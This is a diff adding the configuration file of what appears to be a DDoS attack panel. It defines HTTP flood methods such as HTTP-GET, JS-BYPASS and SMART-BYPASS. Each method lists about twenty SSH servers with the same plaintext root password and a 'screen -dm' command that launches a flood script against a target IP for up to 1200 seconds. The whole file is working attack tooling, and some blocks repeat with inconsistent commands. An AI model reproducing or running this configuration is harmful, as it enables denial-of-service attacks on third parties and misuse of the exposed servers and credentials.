@@ -1,0 +1,98 @@
+================
+Alias=HTTP-GET
+Methods=HTTP-GET
+Maxtime=1200
+Server=45.146.252.156:22,        134.255.234.158:22,        134.255.234.158:22,        185.239.239.53:22,        185.223.31.167:22,        89.40.4.219:22,        89.40.13.103:22,        74.91.122.81:22,        188.214.144.252:22,        188.214.144.191:22,        37.221.65.125:22,       37.221.65.89:22,        176.123.2.70:22,        91.208.197.125:22,        62.171.140.75:22,        134.255.218.68:22,     188.214.144.176:22,     185.239.239.53:22,     94.103.188.146:22,   194.35.13.224:22,    194.35.13.225:22
+Credentials=root:layer7server420!, root:layer7server420!, root:layer7server420!,   root:layer7server420!,     root:layer7server420!,     root:layer7server420!,      root:layer7server420!,     root:layer7server420!,     root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!
+Command=screen -dm node HTTP-GET <IP> list.txt <Time> GET
+================
+Alias=HTTP-GETv2
+Methods=HTTP-GETv2
+Maxtime=1200
+Server=45.146.252.156:22,        134.255.234.158:22,        134.255.234.158:22,        185.239.239.53:22,        185.223.31.167:22,        89.40.4.219:22,        89.40.13.103:22,        74.91.122.81:22,        188.214.144.252:22,        188.214.144.191:22,        37.221.65.125:22,       37.221.65.89:22,        176.123.2.70:22,        91.208.197.125:22,        62.171.140.75:22,        134.255.218.68:22,     188.214.144.176:22,     185.239.239.53:22,     94.103.188.146:22,   194.35.13.224:22,    194.35.13.225:22
+Credentials=root:layer7server420!, root:layer7server420!, root:layer7server420!,   root:layer7server420!,     root:layer7server420!,     root:layer7server420!,      root:layer7server420!,     root:layer7server420!,     root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!
+Command=screen -dm node node test <IP> <Time>
+================
+Alias=HTTP-SOCKET
+Methods=HTTP-SOCKET
+Maxtime=1200
+Server=45.146.252.156:22,        134.255.234.158:22,        134.255.234.158:22,        185.239.239.53:22,        185.223.31.167:22,        89.40.4.219:22,        89.40.13.103:22,        74.91.122.81:22,        188.214.144.252:22,        188.214.144.191:22,        37.221.65.125:22,       37.221.65.89:22,        176.123.2.70:22,        91.208.197.125:22,        62.171.140.75:22,        134.255.218.68:22,     188.214.144.176:22,     185.239.239.53:22,     94.103.188.146:22,   194.35.13.224:22,    194.35.13.225:22
+Credentials=root:layer7server420!, root:layer7server420!, root:layer7server420!,   root:layer7server420!,     root:layer7server420!,     root:layer7server420!,      root:layer7server420!,     root:layer7server420!,     root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!
+Command=screen -dm node HTTP-SOCKET <IP> <Time> 20 list.txt
+================
+Alias=SMART-BYPASS
+Methods=SMART-BYPASS
+Maxtime=1200
+Server=45.146.252.156:22,        134.255.234.158:22,        134.255.234.158:22,        185.239.239.53:22,        185.223.31.167:22,        89.40.4.219:22,        89.40.13.103:22,        74.91.122.81:22,        188.214.144.252:22,        188.214.144.191:22,        37.221.65.125:22,       37.221.65.89:22,        176.123.2.70:22,        91.208.197.125:22,        62.171.140.75:22,        134.255.218.68:22,     188.214.144.176:22,     185.239.239.53:22,     94.103.188.146:22,   194.35.13.224:22,    194.35.13.225:22
+Credentials=root:layer7server420!, root:layer7server420!, root:layer7server420!,   root:layer7server420!,     root:layer7server420!,     root:layer7server420!,      root:layer7server420!,     root:layer7server420!,     root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!
+Command=screen -dm ./SMART-BYPASS version=2 host=<IP> limit=64 time=<Time> list=list.txt threads=800 mode=GET
+================
+Alias=JS-BYPASS
+Methods=JS-BYPASS
+Maxtime=1200
+Server=45.146.252.156:22,        134.255.234.158:22,        134.255.234.158:22,        185.239.239.53:22,        185.223.31.167:22,        89.40.4.219:22,        89.40.13.103:22,        74.91.122.81:22,        188.214.144.252:22,        188.214.144.191:22,        37.221.65.125:22,       37.221.65.89:22,        176.123.2.70:22,        91.208.197.125:22,        62.171.140.75:22,        134.255.218.68:22,     188.214.144.176:22,     185.239.239.53:22,     94.103.188.146:22,   194.35.13.224:22,    194.35.13.225:22
+Credentials=root:layer7server420!, root:layer7server420!, root:layer7server420!,   root:layer7server420!,     root:layer7server420!,     root:layer7server420!,      root:layer7server420!,     root:layer7server420!,     root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!
+Command=screen -dm node JS-BYPASS GET <IP> list.txt <Time> 64 5
+================
+Alias=JS-POST
+Methods=JS-POST
+Maxtime=1200
+Server=45.146.252.156:22,        134.255.234.158:22,        134.255.234.158:22,        185.239.239.53:22,        185.223.31.167:22,        89.40.4.219:22,        89.40.13.103:22,        74.91.122.81:22,        188.214.144.252:22,        188.214.144.191:22,        37.221.65.125:22,       37.221.65.89:22,        176.123.2.70:22,        91.208.197.125:22,        62.171.140.75:22,        134.255.218.68:22,     188.214.144.176:22,     185.239.239.53:22,     94.103.188.146:22,   194.35.13.224:22,    194.35.13.225:22
+Credentials=root:layer7server420!, root:layer7server420!, root:layer7server420!,   root:layer7server420!,     root:layer7server420!,     root:layer7server420!,      root:layer7server420!,     root:layer7server420!,     root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!
+Command=screen -dm node JS-BYPASS POST <IP> list.txt <Time> 64 5
+================
+Alias=HTTP-SPAM
+Methods=HTTP-SPAM
+Maxtime=1200
+Server=45.146.252.156:22,        134.255.234.158:22,        134.255.234.158:22,        185.239.239.53:22,        185.223.31.167:22,        89.40.4.219:22,        89.40.13.103:22,        74.91.122.81:22,        188.214.144.252:22,        188.214.144.191:22,        37.221.65.125:22,       37.221.65.89:22,        176.123.2.70:22,        91.208.197.125:22,        62.171.140.75:22,        134.255.218.68:22,     188.214.144.176:22,     185.239.239.53:22,     94.103.188.146:22,   194.35.13.224:22,    194.35.13.225:22
+Credentials=root:layer7server420!, root:layer7server420!, root:layer7server420!,   root:layer7server420!,     root:layer7server420!,     root:layer7server420!,      root:layer7server420!,     root:layer7server420!,     root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!
+Command=screen -dm node JS-BYPASS GET <IP> list.txt <Time> 64 5
+================
+Alias=HTTP-SPAM
+Methods=HTTP-SPAM
+Maxtime=1200
+Server=45.146.252.156:22,        134.255.234.158:22,        134.255.234.158:22,        185.239.239.53:22,        185.223.31.167:22,        89.40.4.219:22,        89.40.13.103:22,        74.91.122.81:22,        188.214.144.252:22,        188.214.144.191:22,        37.221.65.125:22,       37.221.65.89:22,        176.123.2.70:22,        91.208.197.125:22,        62.171.140.75:22,        134.255.218.68:22,     188.214.144.176:22,     185.239.239.53:22,     94.103.188.146:22,   194.35.13.224:22,    194.35.13.225:22
+Credentials=root:layer7server420!, root:layer7server420!, root:layer7server420!,   root:layer7server420!,     root:layer7server420!,     root:layer7server420!,      root:layer7server420!,     root:layer7server420!,     root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!
+Command=screen -dm node node test <IP> <Time>
+================
+Alias=HTTP-SPAM
+Methods=HTTP-SPAM
+Maxtime=1200
+Server=45.146.252.156:22,        134.255.234.158:22,        134.255.234.158:22,        185.239.239.53:22,        185.223.31.167:22,        89.40.4.219:22,        89.40.13.103:22,        74.91.122.81:22,        188.214.144.252:22,        188.214.144.191:22,        37.221.65.125:22,       37.221.65.89:22,        176.123.2.70:22,        91.208.197.125:22,        62.171.140.75:22,        134.255.218.68:22,     188.214.144.176:22,     185.239.239.53:22,     94.103.188.146:22,   194.35.13.224:22,    194.35.13.225:22
+Credentials=root:layer7server420!, root:layer7server420!, root:layer7server420!,   root:layer7server420!,     root:layer7server420!,     root:layer7server420!,      root:layer7server420!,     root:layer7server420!,     root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!
+Command=screen -dm node bypass <IP> http.txt socket <Time> 10 False
+================
+Alias=HTTP-SOCKETv2
+Methods=HTTP-SOCKETv2
+Maxtime=1200
+Server=45.146.252.156:22,        134.255.234.158:22,        134.255.234.158:22,        185.239.239.53:22,        185.223.31.167:22,        89.40.4.219:22,        89.40.13.103:22,        74.91.122.81:22,        188.214.144.252:22,        188.214.144.191:22,        37.221.65.125:22,       37.221.65.89:22,        176.123.2.70:22,        91.208.197.125:22,        62.171.140.75:22,        134.255.218.68:22,     188.214.144.176:22,     185.239.239.53:22,     94.103.188.146:22,   194.35.13.224:22,    194.35.13.225:22
+Credentials=root:layer7server420!, root:layer7server420!, root:layer7server420!,   root:layer7server420!,     root:layer7server420!,     root:layer7server420!,      root:layer7server420!,     root:layer7server420!,     root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!
+Command=screen -dm node bypass <IP> http.txt socket <Time> 10 False
+================
+Alias=BROWSER-BETA
+Methods=BROWSER-BETA
+Maxtime=1200
+Server=45.146.252.156:22,        134.255.234.158:22,        134.255.234.158:22,        185.239.239.53:22,        185.223.31.167:22,        89.40.4.219:22,        89.40.13.103:22,        74.91.122.81:22,        188.214.144.252:22,        188.214.144.191:22,        37.221.65.125:22,       37.221.65.89:22,        176.123.2.70:22,        91.208.197.125:22,        62.171.140.75:22,        134.255.218.68:22,     188.214.144.176:22,     185.239.239.53:22,     94.103.188.146:22,   194.35.13.224:22,    194.35.13.225:22
+Credentials=root:layer7server420!, root:layer7server420!, root:layer7server420!,   root:layer7server420!,     root:layer7server420!,     root:layer7server420!,      root:layer7server420!,     root:layer7server420!,     root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!
+Command=screen -dm node BROWSERV2 <IP> <Time> browser.txt ua.txt 6 30
+================
+Alias=HTTP-GET
+Methods=HTTP-GET
+Maxtime=1200
+Server=45.146.252.156:22,        134.255.234.158:22,        134.255.234.158:22,        185.239.239.53:22,        185.223.31.167:22,        89.40.4.219:22,        89.40.13.103:22,        74.91.122.81:22,        188.214.144.252:22,        188.214.144.191:22,        37.221.65.125:22,       37.221.65.89:22,        176.123.2.70:22,        91.208.197.125:22,        62.171.140.75:22,        134.255.218.68:22,     188.214.144.176:22,     185.239.239.53:22,     94.103.188.146:22,   194.35.13.224:22,    194.35.13.225:22
+Credentials=root:layer7server420!, root:layer7server420!, root:layer7server420!,   root:layer7server420!,     root:layer7server420!,     root:layer7server420!,      root:layer7server420!,     root:layer7server420!,     root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!
+Command=screen -dm node HTTP-GET <IP> http.txt <Time> GET
+================
+Alias=HTTP-GET
+Methods=HTTP-GET
+Maxtime=1200
+Server=45.146.252.156:22,        134.255.234.158:22,        134.255.234.158:22,        185.239.239.53:22,        185.223.31.167:22,        89.40.4.219:22,        89.40.13.103:22,        74.91.122.81:22,        188.214.144.252:22,        188.214.144.191:22,        37.221.65.125:22,       37.221.65.89:22,        176.123.2.70:22,        91.208.197.125:22,        62.171.140.75:22,        134.255.218.68:22,     188.214.144.176:22,     185.239.239.53:22,     94.103.188.146:22,   194.35.13.224:22,    194.35.13.225:22
+Credentials=root:layer7server420!, root:layer7server420!, root:layer7server420!,   root:layer7server420!,     root:layer7server420!,     root:layer7server420!,      root:layer7server420!,     root:layer7server420!,     root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!
+Command=screen -dm node HTTP-GET <IP> list.txt <Time> GET
+================
+Alias=HTTP-GET
+Methods=HTTP-GET
+Maxtime=1200
+Server=45.146.252.156:22,        134.255.234.158:22,        134.255.234.158:22,        185.239.239.53:22,        185.223.31.167:22,        89.40.4.219:22,        89.40.13.103:22,        74.91.122.81:22,        188.214.144.252:22,        188.214.144.191:22,        37.221.65.125:22,       37.221.65.89:22,        176.123.2.70:22,        91.208.197.125:22,        62.171.140.75:22,        134.255.218.68:22,     188.214.144.176:22,     185.239.239.53:22,     94.103.188.146:22,   194.35.13.224:22,    194.35.13.225:22
+Credentials=root:layer7server420!, root:layer7server420!, root:layer7server420!,   root:layer7server420!,     root:layer7server420!,     root:layer7server420!,      root:layer7server420!,     root:layer7server420!,     root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!,    root:layer7server420!
+Command=screen -dm node HTTP-GET <IP> list.txt <Time> GET
